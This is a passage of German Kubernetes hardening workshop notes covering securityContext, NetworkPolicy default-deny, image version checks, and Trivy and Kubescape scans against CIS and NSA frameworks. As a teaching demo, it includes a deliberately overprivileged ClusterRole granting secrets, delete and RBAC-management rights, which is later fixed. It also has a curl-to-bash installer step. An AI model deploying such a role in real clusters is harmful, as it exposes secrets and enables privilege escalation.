  'allowPrivilegeEscalation': sc.get('allowPrivilegeEscalation', True) == False,
  'capabilities dropped':     sc.get('capabilities', {}).get('drop', []) == ['ALL'],
  'seccompProfile':           psc.get('seccompProfile', {}).get('type') == 'RuntimeDefault',
}
for k, v in checks.items():
    status = 'PASS' if v else 'FAIL'
    print(f'  {status}  {k}')
"
```

---

### Aufraeumen

```
kubectl delete pod pod-root pod-nonroot pod-readonly pod-nocaps pod-hardened -n securitycontext
```

---

### Zusammenfassung

| Was | Wo konfiguriert | Warum |
|-----|----------------|-------|
| `runAsNonRoot` / `runAsUser` | `pod.spec.securityContext` | Kein root im Container (CIS 5.2.7) |
| `readOnlyRootFilesystem` | `container.securityContext` | Kein Schreiben ins Filesystem (CIS 5.2.4) |
| `allowPrivilegeEscalation: false` | `container.securityContext` | Kein sudo/setuid (CIS 5.2.6) |
| `capabilities.drop: ["ALL"]` | `container.securityContext` | Keine Kernel-Privilegien (CIS 5.2.9) |
| `seccompProfile: RuntimeDefault` | `pod.spec.securityContext` | Syscall-Filter (CIS 5.2.2) |
| `emptyDir` Volumes | `volumes` + `volumeMounts` | Schreibbare Verzeichnisse fuer die App |
| `nginxinc/nginx-unprivileged` | Image | nginx ohne root-Anforderung |

### Referenzen

  * https://kubernetes.io/docs/tasks/configure-pod-container/security-context/
  * https://kubernetes.io/docs/concepts/security/pod-security-standards/
  * https://www.cisecurity.org/benchmark/kubernetes (Sektion 5.2)

## Kubernetes - NetworkPolicy

### Kap. 5.3 - Pod-Traffic absichern: Default-Deny, DNS, Pod-zu-Pod


### Hintergrund

Ohne NetworkPolicy kann **jeder Pod mit jedem anderen Pod** im Cluster
kommunizieren — egal in welchem Namespace. Das ist der unsichere Standardzustand.

NetworkPolicies wirken wie eine Firewall auf Pod-Ebene:

| Konzept | Beschreibung |
|---------|-------------|
| `podSelector` | Fuer welche Pods gilt diese Policy |
| `policyTypes` | `Ingress`, `Egress` oder beides |
| `ingress.from` | Wer darf eingehenden Traffic schicken |
| `egress.to` | Wohin darf ausgehender Traffic gehen |
| Leere Policy | Blockiert alles (Default-Deny) |
| Keine Policy | Alles erlaubt |

**Wichtig:** NetworkPolicies werden vom CNI-Plugin durchgesetzt.
Unser Cluster verwendet **Calico** — Standard-NetworkPolicies funktionieren
hier vollstaendig. Mehr dazu am Ende der Uebung.

---

### Schritt 1: Ausgangslage — kein Schutz

```
cd
mkdir -p manifests/networkpolicy
cd manifests/networkpolicy
```

Frontend- und Backend-Pod anlegen:

```
## vi 00-baseline.yml
apiVersion: v1
kind: Pod
metadata:
  name: backend
  labels:
    app: backend
spec:
  containers:
  - name: app
    image: nginx:1.27
    ports:
    - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: backend
spec:
  selector:
    app: backend
  ports:
  - port: 80
    targetPort: 80
---
apiVersion: v1
kind: Pod
metadata:
  name: frontend
  labels:
    app: frontend
spec:
  containers:
  - name: web
    image: nginx:1.27
    ports:
    - containerPort: 80
```

```
kubectl apply -f 00-baseline.yml -n default
kubectl get pod,svc -n default
```

Warten bis beide Pods laufen:

```
kubectl wait pod frontend backend --for=condition=Ready -n default --timeout=60s
```

Frontend erreicht Backend — kein Problem:

```
kubectl exec -n default frontend -- curl -s http://backend | grep title
```

**Erwartete Ausgabe:** nginx-Titelzeile — Verbindung funktioniert ungehindert.

---

### Schritt 2: Default-Deny — alles blockieren

Die erste und wichtigste Policy: keinen Traffic erlauben, den wir nicht
explizit freigegeben haben.

```
## vi 01-default-deny.yml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

`podSelector: {}` bedeutet: gilt fuer **alle** Pods im Namespace.

```
kubectl apply -f 01-default-deny.yml -n default
```

Verbindung testen:

```
kubectl exec -n default frontend -- curl -s --max-time 5 http://backend
```

**Erwarteter Fehler:**
```
curl: (28) Connection timed out after 5000 milliseconds
```

Auch DNS ist jetzt geblockt:

```
kubectl exec -n default frontend -- curl -s --max-time 5 http://example.com
```

**Erwarteter Fehler:** Timeout — kein Egress, kein DNS.

---

### Schritt 3: DNS freigeben

Ohne DNS koennen Pods keine Servicenamen aufloesen. Wir erlauben
Egress zu kube-dns im `kube-system`-Namespace.

```
## vi 02-allow-dns.yml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

```
kubectl apply -f 02-allow-dns.yml -n default
```

DNS testen:

```
kubectl exec -n default frontend -- getent hosts backend
```

**Erwartete Ausgabe:** IP-Adresse wird aufgeloest (z.B. `10.96.x.x  backend.default.svc.cluster.local`).

HTTP zu Backend schlaegt aber noch fehl:

```
kubectl exec -n default frontend -- curl -s --max-time 5 http://backend
```

**Erwarteter Fehler:** Timeout — HTTP-Traffic noch gesperrt.

---

### Schritt 4: Frontend darf Backend auf Port 80 erreichen

```
## vi 03-frontend-to-backend.yml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-egress-to-backend
spec:
  podSelector:
    matchLabels:
      app: frontend
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: backend
    ports:
    - protocol: TCP
      port: 80
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-ingress-from-frontend
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 80
```

```
kubectl apply -f 03-frontend-to-backend.yml -n default
```

Verbindung testen:

```
kubectl exec -n default frontend -- curl -s http://backend | grep title
```

**Erwartete Ausgabe:** nginx-Titelzeile — Verbindung funktioniert wieder.

---

### Schritt 5: Isolation verifizieren

Externer Traffic bleibt gesperrt (Egress-Deny greift):

```
kubectl exec -n default frontend -- curl -s --max-time 5 http://www.google.de
```

**Erwarteter Fehler:** Timeout.

Backend kann Frontend **nicht** erreichen (kein Egress vom Backend freigegeben):

```
kubectl exec -n default backend -- curl -s --max-time 5 http://frontend
```

**Erwarteter Fehler:** Timeout.

Alle aktiven NetworkPolicies anzeigen:

```
kubectl get networkpolicy -n default
```

**Erwartete Ausgabe:**
```
NAME                          POD-SELECTOR    AGE
allow-dns                     <none>          ...
backend-ingress-from-frontend app=backend     ...
default-deny-all              <none>          ...
frontend-egress-to-backend    app=frontend    ...
```

---

### Grenzen von Standard-NetworkPolicies

Standard-NetworkPolicies koennen nur nach **IP, Port und Pod/Namespace-Label**
filtern — keine Domainnamen, keine L7-Regeln.

| Anforderung | Standard-NP | Calico CRD |
|-------------|------------|------------|
| Pod-zu-Pod nach Label | ja | ja |
| Namespace-Isolation | ja | ja |
| Default-Deny cluster-weit | nein | ja (`GlobalNetworkPolicy`) |
| Egress nach Domainname (FQDN) | nein | ja (`NetworkSet` + FQDN) |
| HTTP-Methoden / Pfade (L7) | nein | ja (mit Istio/Cilium) |

Wer Calico als CNI hat, kann mit `GlobalNetworkPolicy` eine
**cluster-weite** Default-Deny-Policy setzen — ohne dass jeder Namespace
seine eigene anlegen muss:

```
## Beispiel: Calico GlobalNetworkPolicy (kein Standard-Kubernetes!)
apiVersion: projectcalico.org/v3
kind: GlobalNetworkPolicy
metadata:
  name: default-deny
spec:
  selector: all()
  types:
  - Ingress
  - Egress
```

Referenz: https://docs.tigera.io/calico/latest/network-policy/networkpolicy-get-started

---

### Aufraeumen

```
kubectl delete -f 03-frontend-to-backend.yml \
               -f 02-allow-dns.yml \
               -f 01-default-deny.yml \
               -f 00-baseline.yml \
               -n default
```

---

### Zusammenfassung

| Policy | Zweck |
|--------|-------|
| `default-deny-all` | Alles sperren — Ausgangsbasis |
| `allow-dns` | DNS fuer alle Pods freigeben |
| `frontend-egress-to-backend` | Frontend darf Backend ansprechen |
| `backend-ingress-from-frontend` | Backend nimmt nur vom Frontend an |

Die Kombination aus Default-Deny + gezielten Freigaben ist das
**Zero-Trust-Prinzip** auf Netzwerkebene — genau das verlangt CIS 5.3.

### Referenzen

  * https://kubernetes.io/docs/concepts/services-networking/network-policies/
  * https://docs.tigera.io/calico/latest/network-policy/
  * https://www.cisecurity.org/benchmark/kubernetes (Sektion 5.3)

## Kubernetes - Veraltete Images

### Kap. 5.x - Veraltete Images finden mit version-checker


### Hintergrund

**version-checker** (jetstack, Apache 2.0) laeuft als Pod im Cluster, beobachtet
alle laufenden Container und vergleicht deren Image-Versionen mit der jeweiligen
Registry. Das Ergebnis ist eine Prometheus-Metrik die man direkt mit kubectl
abfragen kann — kein Prometheus, kein Grafana noetig.

---

### Schritt 1: version-checker deployen

```
kubectl apply -k https://github.com/jetstack/version-checker/deploy/yaml
```

```
namespace/version-checker created
serviceaccount/version-checker created
clusterrole.rbac.authorization.k8s.io/version-checker created
clusterrolebinding.rbac.authorization.k8s.io/version-checker created
service/version-checker created
deployment.apps/version-checker created
```

Standardmaessig prueft version-checker nur Pods mit einer opt-in Annotation.
Mit `--test-all-containers` prueft er alle Pods im Cluster automatisch:

```
kubectl -n version-checker patch deployment version-checker \
  --type=json \
  -p='[{"op":"add","path":"/spec/template/spec/containers/0/args","value":["--test-all-containers"]}]'
```

Warten bis der Pod bereit ist:

```
kubectl -n version-checker rollout status deployment/version-checker
```

```
deployment "version-checker" successfully rolled out
```

---

### Schritt 2: Ergebnisse abfragen

kubectl kann den Metrics-Endpunkt direkt ueber den API-Server proxyen —
kein separater Prozess noetig:

```
kubectl get --raw \
  /api/v1/namespaces/version-checker/services/version-checker:8080/proxy/metrics \
  | grep version_checker_is_latest_version
```

Nur veraltete Images (`value = 0` bedeutet: nicht aktuell):

```
kubectl get --raw \
  /api/v1/namespaces/version-checker/services/version-checker:8080/proxy/metrics \
  | grep "version_checker_is_latest_version{" | grep " 0$"
```

**Beispielausgabe aus unserem Cluster:**
```
...{container="calico-apiserver",current_version="v3.31.2",latest_version="v3.32.0",...} 0
...{container="coredns",current_version="v1.13.1",latest_version="v1.14.3",...} 0
...{container="nginx",current_version="sha256:6e234...",latest_version="trixie-perl@sha256:3d55...",image="nginx",...} 0
```

Jede Zeile enthaelt `current_version` (was laeuft) und `latest_version` (was
in der Registry aktuell ist).

---

### Schritt 3: Abfragefehler anzeigen

Nicht jede Registry kann version-checker automatisch abfragen — `registry.k8s.io`
zum Beispiel erlaubt keine oeffentliche Tag-Suche:

```
kubectl get --raw \
  /api/v1/namespaces/version-checker/services/version-checker:8080/proxy/metrics \
  | grep version_checker_image_failures_total | grep -v "^#"
```

**Beispiel:**
```
version_checker_image_failures_total{container="kube-apiserver",image="registry.k8s.io/kube-apiserver:v1.35.2",...} 1
version_checker_image_failures_total{container="etcd",image="registry.k8s.io/etcd:3.6.6-0",...} 1
```

Das sind bekannte Grenzen — nicht jede Registry unterstuetzt die Docker
Registry API v2 fuer Tag-Listings.

---

### Private Registry

version-checker unterstuetzt beliebige private Registries (Harbor, Nexus,
Artifactory) ueber Umgebungsvariablen im Deployment. Der `<NAME>`-Suffix
erlaubt mehrere Registries gleichzeitig:

```
VERSION_CHECKER_SELFHOSTED_HOST_INTERN=registry.intern:5000
VERSION_CHECKER_SELFHOSTED_USERNAME_INTERN=nutzer
VERSION_CHECKER_SELFHOSTED_PASSWORD_INTERN=passwort
```

Danach prueft version-checker Images von `registry.intern:5000/...` genauso
wie oeffentliche Images — `latest_version` kommt dann aus der internen Registry.
Das ist der Standardweg in Air-Gapped Umgebungen.

---

### Aufraeumen

```
kubectl delete -k https://github.com/jetstack/version-checker/deploy/yaml
```

---

### Zusammenfassung

| Was | Befehl |
|-----|--------|
| Alle Images mit Status | `kubectl get --raw .../proxy/metrics \| grep is_latest` |
| Nur veraltete Images | `... \| grep is_latest \| grep ' 0$'` |
| Abfragefehler | `... \| grep failures_total \| grep -v '^#'` |
| Private Registry | `VERSION_CHECKER_SELFHOSTED_*` ENV im Deployment |

## Kubernetes - Security Scanning mit Trivy

### CIS 1.x/4.x/5.x - Trivy: Image-CVEs und Cluster-Compliance-Check


### Szenario

Der Cluster laeuft — aber wie sicher ist er wirklich?
Wir spielen den Security-Audit: erst schauen was da ist, dann CVEs pruefen,
dann den ganzen Cluster gegen den CIS Benchmark pruefe.

---

### Schritt 1: trivy installieren

```
curl -sL https://github.com/aquasecurity/trivy/releases/download/v0.70.0/trivy_0.70.0_Linux-64bit.tar.gz \
  | tar -xz -C ~/bin trivy

trivy --version
```

**Erwartete Ausgabe:**
```
Version: 0.70.0
```

trivy ist ein CNCF Graduated Project (Apache 2.0) — dasselbe Tool das viele Teams
bereits fuer Image-Scanning in der CI/CD-Pipeline nutzen.

---

### Schritt 2: Was laeuft ueberhaupt im Cluster?

Bevor wir scannen: einen Ueberblick verschaffen welche Images im Einsatz sind.

```
kubectl get pods -A \
  -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.spec.containers[*].image}{"\n"}{end}' \
  | sort -u
```

Gibt es Images mit `latest`-Tag — das Anti-Pattern schlechthin?

```
kubectl get pods -A -o json | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    for c in item['spec'].get('containers', []):
        img = c['image']
        if img.endswith(':latest') or ':' not in img:
            print(f'LATEST TAG: {ns}/{name} -> {img}')
"
```

`latest` bedeutet: niemand weiss welche Version wirklich laeuft,
Updates sind unkontrolliert. In Produktion: immer feste Tags verwenden.

---

### Schritt 3: Ein Image auf CVEs pruefen

Wir nehmen `nginx:1.27` — das Image das im Workshop bereits laeuft.
Erst nur Critical und High:

```
trivy image --severity CRITICAL,HIGH nginx:1.27
```

> Beim ersten Aufruf laedt trivy die Vulnerability-Datenbank (~90 MB).
> Danach: `--skip-db-update` nutzen.

Die Ausgabe zeigt pro CVE:

```
Library    Vulnerability   Severity   Installed   Fixed in   Title
openssl    CVE-2024-xxxx   HIGH       3.0.2       3.0.9      ...
```

**Wie viele Findings gibt es?** Viele — das ist normal fuer ein Standard-Image.
Entscheidend ist: welche sind **fixbar**?

---

### Schritt 4: Nur fixbare CVEs anzeigen

Mit `--ignore-unfixed` zeigt trivy nur Pakete fuer die bereits ein Fix existiert —
das ist die direkt umsetzbare Arbeitsliste:

```
trivy image --ignore-unfixed --severity CRITICAL,HIGH --skip-db-update nginx:1.27
```

Die Spalte `FIXED-VERSION` zeigt genau auf welche Version man upgraden muesste.

**Vergleich:** Wie sieht das beim gehaerteten Image aus?

```
trivy image --ignore-unfixed --severity CRITICAL,HIGH --skip-db-update \
  nginxinc/nginx-unprivileged:1.27
```

Weniger Findings — `nginx-unprivileged` hat ein schlankeres Basisimage.

---

### Schritt 5: Cluster-weiter Sicherheitsscan

Jetzt nicht nur ein Image, sondern den ganzen Cluster.

> **Hinweis:** `trivy k8s` startet intern einen node-collector Job auf jedem Node.
> Der Control-Plane-Node hat standardmaessig einen NoSchedule-Taint — dieser muss
> kurz entfernt werden, sonst gibt es einen Timeout-Fehler:

```
kubectl taint nodes k8s-tln1-cp node-role.kubernetes.io/control-plane:NoSchedule-
```

```
trivy k8s --report=summary --skip-db-update
```

Taint danach wieder setzen:

```
kubectl taint nodes k8s-tln1-cp node-role.kubernetes.io/control-plane:NoSchedule
```

> **Falls der Fehler "node-collector job already exists" erscheint:**
> Ein vorheriger Scan-Lauf hat einen Job hinterlassen. Loeschen und nochmal:
> ```
> kubectl delete namespace trivy-temp --force --grace-period=0
> # kurz warten, dann nochmal:
> trivy k8s --report=summary --skip-db-update
> ```

Die Ausgabe gliedert sich in drei Bereiche:

```
Workload Assessment    <- Pods, Deployments, Jobs (unsere Workloads)
Infra Assessment       <- kube-system, etcd, API-Server
RBAC Assessment        <- Roles, ClusterRoles, Bindings
```

Spalten: **C**ritical / **H**igh / **M**edium / **L**ow / **U**nknown

Schau dir die `default`-Namespace-Zeile an:

```
│ default │ Pod/nginx │ 1 │ 15 │ 90 │ 117 │ 10 │  │ 3 │ 5 │ 11 │
```

Ein nginx-Pod: 1 Critical, 15 High CVEs — und 3 High Misconfigurations.

---

### Schritt 6: Einen Namespace gezielt scannen — nur Misconfigs

Schneller Check des eigenen Namespaces ohne CVE-Download:

```
trivy k8s --report=summary --skip-db-update \
  --scanners misconfig \
  --include-namespaces tln<nr>
```

Was bedeuten die Misconfig-Findings konkret? Detailansicht:

```
trivy k8s --skip-db-update \
  --scanners misconfig \
  --severity HIGH,CRITICAL \
  --include-namespaces tln<nr>
```

Du siehst jetzt genau: "Container should not run as root", "readOnlyRootFilesystem
not set" — das sind die Dinge die wir in der SecurityContext-Uebung gehaertet haben.

---

### Schritt 7: CIS Benchmark Compliance-Report

Der Hoehepunkt: trivy prueft den ganzen Cluster direkt gegen den
CIS Kubernetes Benchmark und zeigt PASS/FAIL pro Control-ID:

```
trivy k8s --compliance=k8s-cis-1.23 --report=summary --skip-db-update
```

Erkennst du die Findings wieder?

```
ID       Severity  Control Name                                  Status  Issues
1.2.18   LOW       --profiling argument is set to false          FAIL    1
1.2.19   LOW       --audit-log-path argument is set              FAIL    1
1.2.30   LOW       --encryption-provider-config argument is set  FAIL    1
5.1.1    HIGH      cluster-admin only used where required        FAIL    2
5.2.6    HIGH      allowPrivilegeEscalation minimized            FAIL    15
5.2.7    MEDIUM    Minimize the admission of root containers     FAIL    16
5.7.3    HIGH      Apply Security Context to Pods and Containers FAIL    46
```

Ordne die Findings den Uebungen zu die wir bereits gemacht haben:

| CIS ID | Finding | Behandelt in |
|--------|---------|-------------|
| 1.2.18 | Profiling aktiv | hardening-control-plane-profiling.md |
| 1.2.19 | Kein Audit Logging | audit-logging-exercise.md |
| 5.1.x | RBAC-Schwachstellen | rbac-exercise-scanning.md |
| 5.2.x | Kein SecurityContext | securitycontext-exercise.md |
| 5.7.3 | 46 Pods ohne SecurityContext | securitycontext-exercise.md |

> Warum `k8s-cis-1.23` und nicht 1.32? Trivy liefert versionierte Compliance-Specs mit.
> Die Kernkontrollen gelten unveraendert fuer 1.32.

Verfuegbare Profile:

```
trivy k8s --help | grep -A8 "compliance string"
```

---

### Schritt 8: RBAC-Lage pruefen

Wer hat cluster-admin?

```
rbac-lookup cluster-admin -o wide
```

Welche Pods mounten automatisch ein SA-Token (sollten sie nicht):

```
kubectl get pods -A -o json | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    if item['spec'].get('automountServiceAccountToken', True):
        print(f'TOKEN GEMOUNTET: {ns}/{name}')
" | grep -v "kube-system\|calico"
```

---

### Exkurs: Warum CIS 5.1.2 nicht vollstaendig fixbar ist

5.1.2 zeigt 14 Findings — Rollen mit Secrets-Zugriff. Die Ursache:

| ClusterRole | Wer stellt sie wieder her? |
|-------------|---------------------------|
| `cluster-admin`, `admin`, `edit` | kube-controller-manager (by Design) |
| `tigera-operator` | tigera-operator Reconciliation Loop |

Beide Mechanismen setzen Aenderungen zurueck. Das ist **kein Bug**, das ist
Kubernetes-Design.

Der einzige echte Hebel: pruefen ob diese Rollen unnoetig gebunden sind:

```
rbac-lookup admin -o wide
rbac-lookup edit -o wide
```

Sind sie an niemanden gebunden der sie nicht braucht — ist das Finding ein
strukturelles **False-Positive**.

In der Praxis: **Risk Acceptance** — dokumentieren warum das Finding nicht fixbar
ist. Das ist legitimer Security-Prozess.

---

### Zusammenfassung

| Was pruefen | Befehl |
|-------------|--------|
| Welche Images laufen? | `kubectl get pods -A -o jsonpath=...` |
| Image auf CVEs | `trivy image --severity CRITICAL,HIGH <image>` |
| Nur fixbare CVEs | `trivy image --ignore-unfixed ...` |
| Cluster-Gesamtueberblick | `trivy k8s --report=summary --skip-db-update` |
| CIS Compliance | `trivy k8s --compliance=k8s-cis-1.23 --report=summary` |
| Namespace Misconfigs | `trivy k8s --scanners misconfig --include-namespaces tln<nr>` |
| Wer hat cluster-admin? | `rbac-lookup cluster-admin -o wide` |

### Referenzen

  * https://github.com/aquasecurity/trivy
  * https://trivy.dev/latest/docs/target/kubernetes/
  * https://trivy.dev/latest/docs/compliance/
  * https://github.com/FairwindsOps/rbac-lookup

## Kubernetes - Security Scanning mit Kubescape

### NSA/MITRE/CIS - Kubescape: Framework-Compliance und RBAC-Schwachstellen finden


### Hintergrund: kubescape und seine Betriebsmodi

kubescape ist ein Open-Source-Security-Scanner (CNCF Sandbox) von ARMO.
Er prueft Kubernetes-Cluster gegen bekannte Sicherheits-Frameworks und zeigt
konkrete Findings mit Remediation-Hinweisen.

**Betriebsmodi:**

| Modus | Beschreibung | Einsatz |
|-------|-------------|---------|
| **CLI** | Einmalige oder gescriptete Scans | CI/CD, Ad-hoc-Audits |
| **Operator** | Laeuft permanent im Cluster, integriert sich mit Kubescape Cloud | Kontinuierliches Monitoring, Dashboards |

In dieser Uebung nutzen wir die **CLI**.

---

### Hintergrund: Security Frameworks im Ueberblick

Kubescape unterstuetzt mehrere Frameworks. Jedes Framework deckt andere
Aspekte ab und kommt aus einem anderen Kontext:

| Framework | Herausgeber | Fokus | Gut fuer |
|-----------|-------------|-------|---------|
| **NSA** | US National Security Agency | Minimalhaertung fuer produktive Cluster | Einstiegspunkt, breite Coverage |
| **MITRE ATT&CK** | MITRE Corporation | Angreiferverhalten: Taktiken und Techniken | Verstehen wie Angreifer vorgehen |
| **CIS (cis-v1.10.0)** | Center for Internet Security | Detaillierte, nummerierte Controls fuer jede Komponente | Compliance-Audits, konkrete Massnahmen |
| **ArmoBest** | ARMO (kubescape-Entwickler) | Kombination aus NSA + MITRE + eigene Best Practices | Schneller Ueberblick, empfohlen fuer Einsteiger |
| **SOC2** | AICPA | Organisatorische und technische Kontrollen | Regulatorische Compliance |
| **DevOpsBest** | ARMO | Reliabilitaet und Operabilit | Staging/Dev-Cluster |

Alle Controls sind unter https://hub.armosec.io/docs/ dokumentiert.

---

### Schritt 1: Kubescape installieren

```
cd
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | bash
```

Das Installationsskript legt kubescape unter `~/.kubescape/bin/` ab.
PATH fuer diese Session setzen:

```
export PATH=$PATH:/home/tln1/.kubescape/bin
kubescape version
```

**Erwartete Ausgabe:**
```
Your current version is: v4.0.6
```

> **Tipp:** Um den PATH dauerhaft zu setzen:
> ```
> echo 'export PATH=$PATH:/home/tln1/.kubescape/bin' >> ~/.bashrc
> ```

---

### Schritt 2: Verfuegbare Frameworks und Controls anzeigen

Welche Frameworks sind verfuegbar?

```
kubescape list frameworks
```

Alle Controls mit ihren Framework-Zuordnungen:

```
kubescape list controls
```

Die Tabelle zeigt pro Control: ID, Name, Doku-Link, und in welchen Frameworks
das Control vorkommt. RBAC-relevante Controls erkennst du an den Namen:
"List Kubernetes secrets", "Administrative Roles", "Roles with delete capabilities".

---

### Schritt 3: Ersten Cluster-Scan laufen lassen

NSA-Framework als Einstieg — gibt einen guten Gesamtueberblick:

```
kubescape scan framework NSA
```

Die Ausgabe gliedert sich in:
1. Zusammenfassung: Wie viele Controls passed/failed?
2. Fehler nach Severity (High/Medium/Low)
3. Tabelle: pro Control — wie viele Ressourcen betroffen?

Compliance-Score: Wie viel Prozent der Ressourcen bestehen alle Controls?

Schaue dir die RBAC-relevanten Zeilen an:

```
│ Medium   │ Administrative Roles              │ ...
│ Medium   │ Automatic mapping of service account │ ...
```

Um Details zu sehen — welche genauen Ressourcen betroffen sind:

```
kubescape scan framework NSA --verbose
```

---

### Schritt 4: RBAC-Problem absichtlich erstellen

Wir simulieren einen haeufigen Fehler: ein Service Account bekommt
deutlich zu viele Rechte — Secrets lesen/schreiben plus delete-Rechte.

Verzeichnis anlegen:

```
cd
mkdir -p manifests/kubescape-rbac
cd manifests/kubescape-rbac
```

Manifests erstellen:

```
## vi 01-overprivileged.yml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: overprivileged-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: demo-bad-role
rules:
- apiGroups: [""]
  resources: ["secrets", "pods", "nodes"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterroles", "clusterrolebindings"]
  verbs: ["get", "list", "create", "update", "patch", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: demo-bad-binding
subjects:
- kind: ServiceAccount
  name: overprivileged-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: demo-bad-role
  apiGroup: rbac.authorization.k8s.io
```

```
kubectl apply -f 01-overprivileged.yml
```

**Was ist hier problematisch?**

| Problem | Warum gefaehrlich |
|---------|------------------|
| `secrets` mit `list/get` | Angreifer kann alle Secrets im Cluster auslesen |
| `secrets` mit `delete` | Angreifer kann Secrets loeschen (DoS, Sabotage) |
| `clusterroles` mit `create/update` | Privilege Escalation: neue Admin-Rollen erstellen |
| ClusterRoleBinding statt RoleBinding | Zugriff cluster-weit, nicht nur im Namespace |

---

### Schritt 5: RBAC-Schwachstellen gezielt scannen

Nur die RBAC-relevanten Controls pruefen:

```
kubescape scan control C-0015,C-0007 --verbose
```

Controls in dieser Auswahl:

| Control ID | Name | Severity |
|------------|------|---------|
| C-0015 | List Kubernetes secrets | High |
| C-0007 | Roles with delete capabilities | Medium |

**Erwartete Ausgabe — der overprivileged-sa wird gefunden:**

```
#################################################################################
ApiVersion:
Kind: ServiceAccount
Name: overprivileged-sa
Namespace: default

Controls: 2 (Failed: 2, action required: 0)

| Severity | Control name                   |
| High     | List Kubernetes secrets        |
| Medium   | Roles with delete capabilities |
```

Das sind genau die beiden Probleme: Secrets-Zugriff (C-0015) und
delete-Rechte (C-0007).

Zusaetzlich Administrative Roles pruefen:

```
kubescape scan control C-0035 --verbose
```

C-0035 flaggt Service Accounts die cluster-admin-aehnliche Rechte haben.

---

### Schritt 6: RBAC-Problem beheben

Die Regel: so wenig Rechte wie moeglich, so viel wie noetig (Least Privilege).

Fix-Manifest erstellen:

```
## vi 02-fixed-role.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: demo-bad-role
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
```

Kein Secrets-Zugriff mehr, kein delete, kein RBAC-Management.
Falls der Service Account nur Pods im eigenen Namespace lesen muss:
lieber ein `Role` + `RoleBinding` statt `ClusterRole` verwenden.

```
kubectl apply -f 02-fixed-role.yml
```

```
clusterrole.rbac.authorization.k8s.io/demo-bad-role configured
```

---

### Schritt 7: Verifizierung nach dem Fix

```
kubescape scan control C-0015,C-0007 --verbose
```

**Erwartetes Ergebnis:** `overprivileged-sa` erscheint nicht mehr in den Findings.

```
## grep-freundliche Pruefung:
kubescape scan control C-0015,C-0007 --verbose 2>&1 | grep "overprivileged"
```

Keine Ausgabe = kein Finding mehr fuer unseren Service Account.

Gesamtbild vor/nach dem Fix — NSA-Scan wiederholen und Score vergleichen:

```
kubescape scan framework NSA
```

Der Compliance-Score steigt, weil `overprivileged-sa` nicht mehr in
C-0015 und C-0007 faellt.

---

### Exkurs: Kubescape als Operator betreiben

Neben der CLI kann kubescape auch als **Operator** im Cluster installiert werden.
Der Operator laeuft als Controller und scannt kontinuierlich:

```
## Installation via Helm (nur Info, nicht in dieser Uebung ausfuehren):
helm repo add kubescape https://kubescape.github.io/helm-charts/
helm upgrade --install kubescape kubescape/kubescape-operator \
  -n kubescape --create-namespace \
  --set clusterName=my-cluster
```

| CLI | Operator |
|-----|---------|
| Einmaliger Scan | Kontinuierliches Monitoring |
| Kein Cluster-Overhead | Laeuft als Pods im Cluster |
| Gut fuer CI/CD | Gut fuer Dashboards und Alerting |
| Kein Account noetig | Integration mit Kubescape Cloud (optional) |

Dokumentation: https://kubescape.io/docs/install-operator/

---

### Aufraeumen

```
kubectl delete clusterrolebinding demo-bad-binding
kubectl delete clusterrole demo-bad-role
kubectl delete serviceaccount overprivileged-sa -n default
```

---

### Zusammenfassung

| Was pruefen | Befehl |
|-------------|--------|
| Alle Frameworks auflisten | `kubescape list frameworks` |
| Alle Controls auflisten | `kubescape list controls` |
| NSA-Framework scannen | `kubescape scan framework NSA` |
| Einzelne Controls pruefen | `kubescape scan control C-0015,C-0007` |
| Mit Detail-Ausgabe | `kubescape scan control ... --verbose` |

RBAC-relevante Controls im Ueberblick:

| Control ID | Name | Was wird geprueft |
|------------|------|------------------|
| C-0015 | List Kubernetes secrets | Subjects mit Secrets-Lesezugriff |
| C-0007 | Roles with delete capabilities | Subjects mit delete-Verben |
| C-0035 | Administrative Roles | Subjects mit cluster-admin-aehnlichen Rechten |
| C-0034 | Automatic mapping of service account | Pods die automatisch SA-Token mounten |

### Referenzen

  * https://kubescape.io/
  * https://hub.armosec.io/docs/ (Control-Dokumentation)
  * https://kubescape.io/docs/install-operator/
  * https://github.com/kubescape/kubescape

### CIS/NSA - Kubescape: Control-Plane YAML-Dateien offline scannen


### Hintergrund

Kubescape kann nicht nur gegen einen laufenden Cluster scannen,
sondern auch **lokale YAML-Dateien offline analysieren** — ganz ohne
API-Server-Verbindung.

Das ist besonders nuetzlich fuer die Control-Plane-Komponenten:
Die Static-Pod-Manifests unter `/etc/kubernetes/manifests/` liegen direkt
auf dem Node als YAML-Dateien. Kubescape liest sie und prueft sie
gegen Security-Frameworks — kein kubeconfig noetig.

**Warum direkt auf dem Node scannen?**

| Methode | Vorteil |
|---------|---------|
| `kubescape scan` gegen Cluster | Vollstaendiges Bild: alle Namespaces, RBAC, Secrets |
